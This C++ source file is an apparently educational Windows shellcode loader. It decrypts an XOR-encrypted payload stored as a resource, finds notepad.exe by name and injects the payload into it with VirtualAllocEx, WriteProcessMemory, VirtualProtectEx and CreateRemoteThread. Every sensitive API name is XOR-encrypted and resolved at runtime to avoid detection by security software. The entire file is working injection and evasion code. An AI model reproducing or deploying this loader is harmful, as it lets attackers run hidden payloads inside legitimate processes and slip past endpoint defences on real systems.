#include <Windows.h>
#include <stdio.h>
#include "resource.h"
#include <TlHelp32.h>

HRSRC key_res = FindResource(NULL, MAKEINTRESOURCEW(IDR_KEY1), L"KEY");
HGLOBAL keyHandle = LoadResource(NULL, key_res);
unsigned char* key = (unsigned char*)LockResource(keyHandle);
unsigned int key_len = SizeofResource(NULL, key_res);

HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");

void XOR(unsigned char* shellcode, size_t shellcode_len, unsigned char* key, size_t key_len) {
	if (shellcode == NULL || key == NULL || shellcode_len == 0 || key_len == 0) {
		printf("Invalid input parameters\n");
		return;
	}
	for (size_t i = 0; i < shellcode_len; ++i) {
		shellcode[i] ^= key[i % key_len];
	}
}

// Find PID by process name. Returns first occurrence.
int findMyProc(wchar_t* procname) {

	HANDLE hSnapshot; // Handle al snapshot de todos los procesos en el sistema.
	PROCESSENTRY32 pe;
	int pid = 0;
	BOOL hResult;

	printf("Searching for the process %ls to get its PID...\n", procname);

	// snapshot of all processes in the system
	unsigned char CreateToolhelp32SnapshotEncrypted[] = { 0x2A, 0xC4, 0xAB, 0x42, 0x50, 0x6D, 0xBE, 0x0C, 0x0F, 0xF3, 0xCB, 0xE1, 0x66, 0x62, 0x98, 0xBA, 0xCF, 0xD0, 0x42, 0xC9, 0x58, 0x3B, 0x93, 0xA2, 0xB3 };
	XOR(CreateToolhelp32SnapshotEncrypted, sizeof(CreateToolhelp32SnapshotEncrypted), key, key_len);
	auto const pCreateToolhelp32Snapshot = reinterpret_cast<LPVOID(WINAPI*)(DWORD dwFlags, DWORD th32ProcessID)>(
		GetProcAddress(hKernel32, (LPCSTR)CreateToolhelp32SnapshotEncrypted)
		);
	hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

	// It is neccesary to initialize the size of the process entry.
	/* Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32). If you do not initialize dwSize,
	Process32First fails (https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) */
	pe.dwSize = sizeof(PROCESSENTRY32W);

	// Retrieve infrormation about first process encountered in a system snapshot
	unsigned char Process32FirstWEncrypted[] = { 0x39, 0xC4, 0xA1, 0x40, 0x41, 0x7B, 0x99, 0x50, 0x52, 0xD9, 0xCA, 0xF6, 0x79, 0x66, 0xFC, 0x88 };
	XOR(Process32FirstWEncrypted, sizeof(Process32FirstWEncrypted), key, key_len);
	auto const pProcess32FirstW = reinterpret_cast<BOOL(WINAPI*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(
		GetProcAddress(hKernel32, (LPCSTR)Process32FirstWEncrypted)
		);
	hResult = pProcess32FirstW(hSnapshot, &pe);

	// Get information about the obtained process using its handle
	// and exit if unsuccessful
	unsigned char Process32NextWEncrypted[] = { 0x39, 0xC4, 0xA1, 0x40, 0x41, 0x7B, 0x99, 0x50, 0x52, 0xD1, 0xC6, 0xFC, 0x7E, 0x45, 0xAB };
	XOR(Process32NextWEncrypted, sizeof(Process32NextWEncrypted), key, key_len);
	auto const pProcess32NextW = reinterpret_cast<BOOL(WINAPI*)(HANDLE hSnapshot, LPPROCESSENTRY32 lppe)>(
		GetProcAddress(hKernel32, (LPCSTR)Process32NextWEncrypted)
		);
	while (pProcess32NextW(hSnapshot, &pe)) {
		if (lstrcmpW(pe.szExeFile, procname) == 0) {
			pid = pe.th32ProcessID;
			break;
		}
	}

	// Close the open handle; we don't need it
	CloseHandle(hSnapshot);
	return pid;
}

int main(int argc, char* argv[]) {

	DWORD oldprotect = 0;

	HRSRC res;
	HGLOBAL resHandle = NULL;
	unsigned char* shellcode;
	unsigned int shellcode_len;
	// Extract encrypted payload from resources section
	//res = FindResource(NULL, MAKEINTRESOURCEW(IDR_FAVICON_ICO1), L"FAVICON_ICO");
	res = FindResource(NULL, MAKEINTRESOURCEW(IDR_CALC1), L"CALC");
	resHandle = LoadResource(NULL, res);
	shellcode = (unsigned char*)LockResource(resHandle);
	shellcode_len = SizeofResource(NULL, res);

	void* exec_mem;
	unsigned char VirtualAllocEncrypted[] = { 0x3F, 0xDF, 0xBC, 0x57, 0x51, 0x69, 0x86, 0x22, 0x0C, 0xF3, 0xCC, 0xE7, 0x0A };
	XOR(VirtualAllocEncrypted, sizeof(VirtualAllocEncrypted), key, key_len);
	auto const pVirtualAlloc = reinterpret_cast<LPVOID(WINAPI*)(LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD flProtect)>(
		GetProcAddress(hKernel32, (LPCSTR)VirtualAllocEncrypted));
	exec_mem = pVirtualAlloc(0, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	unsigned char RtlMoveMemoryEncrypted[] = { 0x3B, 0xC2, 0xA2, 0x6E, 0x4B, 0x7E, 0x8F, 0x2E, 0x05, 0xF2, 0xCC, 0xF6, 0x73, 0x12 };
	XOR(RtlMoveMemoryEncrypted, sizeof(RtlMoveMemoryEncrypted), key, key_len);
	auto const pRtlMoveMemory = reinterpret_cast<VOID(WINAPI*)(VOID UNALIGNED * destination, VOID UNALIGNED * source, SIZE_T  length)>(
		GetProcAddress(hKernel32, (LPCSTR)RtlMoveMemoryEncrypted)
		);
	pRtlMoveMemory(exec_mem, shellcode, shellcode_len);

	XOR((unsigned char*)exec_mem, shellcode_len, key, key_len);

	wchar_t process_name[MAX_PATH] = L"notepad.exe";
	int pid = findMyProc(process_name);

	/* Declaring some variables that will store memaddresses */
	LPVOID lpBufferAddress = NULL; // Pointer to void to store the address of the reserved buffer
	DWORD lpflOldProtect = NULL;
	SIZE_T lpNumberOfBytesWritten = NULL;
	HANDLE hOpenProcess = NULL;

	// Get a handle to the process ID
	printf("Executing OpenProcess to get a handle of process with PID (%ld)\n", pid);
	unsigned char OpenProcessEncrypted[] = { 0x26, 0xC6, 0xAB, 0x4D, 0x74, 0x7A, 0x85, 0x00, 0x05, 0xEC, 0xD0, 0x84 };
	XOR(OpenProcessEncrypted, sizeof(OpenProcessEncrypted), key, key_len);
	auto const pOpenProcess = reinterpret_cast<HANDLE(WINAPI*)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)>(
		GetProcAddress(hKernel32, (LPCSTR)OpenProcessEncrypted)
		);
	hOpenProcess = pOpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);

	// If the function fails, the return value is NULL.
	if (hOpenProcess == NULL) {
		printf("Could not get a handle to PID (%ld). Error code %ld", pid, GetLastError());
		return EXIT_FAILURE;
	}

	printf("Got a handle to PID (%ld). Address of handle: 0x%p\n", pid, hOpenProcess); // With %p we get the memaddress of the handle

	unsigned char VirtualAllocExEncrypted[] = { 0x3F, 0xDF, 0xBC, 0x57, 0x51, 0x69, 0x86, 0x22, 0x0C, 0xF3, 0xCC, 0xE7, 0x4F, 0x6A, 0xAB };
	XOR(VirtualAllocExEncrypted, sizeof(VirtualAllocExEncrypted), key, key_len);
	auto const pVirtualAllocEx = reinterpret_cast<LPVOID(WINAPI*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)>(
		GetProcAddress(hKernel32, (LPCSTR)VirtualAllocExEncrypted)
		);
	lpBufferAddress = pVirtualAllocEx(hOpenProcess, NULL, shellcode_len, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); // We reserve AND commit. For that, use |
	// Remember closing the handle with CloseHandle once the handle is used.
	if (lpBufferAddress == NULL) {
		printf("Memory could not be allocated. Exiting...");
		return EXIT_FAILURE;
	}

	printf("Got a memory zone starting at 0x%p\n", lpBufferAddress);

	unsigned char WriteProcessMemoryEncrypted[] = { 0x3E, 0xC4, 0xA7, 0x57, 0x41, 0x58, 0x98, 0x0C, 0x03, 0xFA, 0xD0, 0xF7, 0x47, 0x77, 0xC6, 0xE7, 0xEE, 0xC7, 0x23 };
	XOR(WriteProcessMemoryEncrypted, sizeof(WriteProcessMemoryEncrypted), key, key_len);
	// We copy the buffer to the buffer as it is writable with WriteProcessMemory
	auto const pWriteProcessMemory = reinterpret_cast<BOOL(WINAPI*)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten)>(
		GetProcAddress(hKernel32, (LPCSTR)WriteProcessMemoryEncrypted)
		);
	BOOL wProcessMemory = pWriteProcessMemory(hOpenProcess, lpBufferAddress, exec_mem, shellcode_len, &lpNumberOfBytesWritten);
	if (!wProcessMemory) {
		printf("Could not write into the injected memory. Error code: %ld", GetLastError());
	}

	printf("Shellcode written into memory.");

	unsigned char VirtualProtectExEncrypted[] = { 0x3F, 0xDF, 0xBC, 0x57, 0x51, 0x69, 0x86, 0x33, 0x12, 0xF0, 0xD7, 0xE1, 0x69, 0x66, 0xEE, 0xF0, 0x9C };
	XOR(VirtualProtectExEncrypted, sizeof(VirtualProtectExEncrypted), key, key_len);
	// We now change the permissions of the memory address to execute, with VirtualProtectEx
	auto const pVirtualProtectEx = reinterpret_cast<BOOL(WINAPI*)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flNewProtect, PDWORD lpflOldProtect)>(
		GetProcAddress(hKernel32, (LPCSTR)VirtualProtectExEncrypted)
		);
	BOOL vProtect = pVirtualProtectEx(hOpenProcess, lpBufferAddress, shellcode_len, PAGE_EXECUTE_READ, &lpflOldProtect);
	if (!vProtect) {
		printf("Was not possible to change the permissions of the buffer. Error code: %ld", GetLastError());
		return EXIT_FAILURE;
	}

	printf("Changed the memory space so it is executable.\nExecuting shellcode...\n");

	HANDLE hThread = NULL;
	unsigned char CreateRemoteThreadEncrypted[] = { 0x2A, 0xC4, 0xAB, 0x42, 0x50, 0x6D, 0xB8, 0x06, 0x0D, 0xF0, 0xD7, 0xE1, 0x5E, 0x7A, 0xD9, 0xED, 0xFD, 0xDA, 0x23 };
	XOR(CreateRemoteThreadEncrypted, sizeof(CreateRemoteThreadEncrypted), key, key_len);
	auto const pCreateRemoteThread = reinterpret_cast<HANDLE(WINAPI*)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)>(
		GetProcAddress(hKernel32, (LPCSTR)CreateRemoteThreadEncrypted)
		);
	hThread = pCreateRemoteThread(hOpenProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBufferAddress, NULL, 0, NULL);

	if (hThread != NULL) {
		WaitForSingleObject(hThread, 500);
		printf("Thread started. Bye...\n");
		CloseHandle(hOpenProcess);
		CloseHandle(hThread);
	}

	return EXIT_SUCCESS;
}